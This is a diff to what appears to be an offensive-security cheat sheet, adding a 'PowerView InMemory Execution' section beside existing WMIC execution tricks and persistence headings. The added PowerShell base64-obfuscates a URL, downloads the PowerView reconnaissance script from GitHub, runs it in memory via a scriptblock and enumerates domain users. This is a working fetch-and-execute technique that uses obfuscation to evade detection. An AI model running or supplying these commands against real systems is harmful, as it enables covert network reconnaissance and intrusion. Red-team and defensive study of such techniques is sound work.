@@ -43,6 +43,7 @@
   * [Execution](#execution)
     * [PowerShell NET Assembly](#powershell-net-assembly)
     * [WMIC Execution](#wmic-execution)
+    * [PowerView InMemory Execution](#powerview-inmemory-execution)
   * [Persistence](#persistence)
     * [Creating Local Administrator User](#creating-local-adminstrator-user)
     * [COM Hijacking](#com-hijacking)
@@ -404,6 +405,18 @@ wmic process call create  "\\?\UNC\127.0.0.1\C$\windows\system32\calc.exe"
 wmic process call create "\\.\GLOBALROOT\??\UNC\127.0.0.1\C$\windows\system32\calc.exe"
 wmic process call create "\\;lanmanredirector\127.0.0.1\C$\windows\system32\calc.exe"
 wmic process call create "\\.\globalroot\osdataroot\windows\notepad.exe"
+```
+
+## **PowerView InMemory Execution**
+
+```
+# $unencodedurl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
+$encodedurl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9tYXN0ZXIvUmVjb24vUG93ZXJWaWV3LnBzMQ=="
+$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedurl))
+$script = (New-Object System.Net.WebClient).DownloadString($url)
+$scriptBlock = [scriptblock]::Create($script)
+. $scriptBlock
+Get-DomainUser
 ```
 
 # **Persistence**
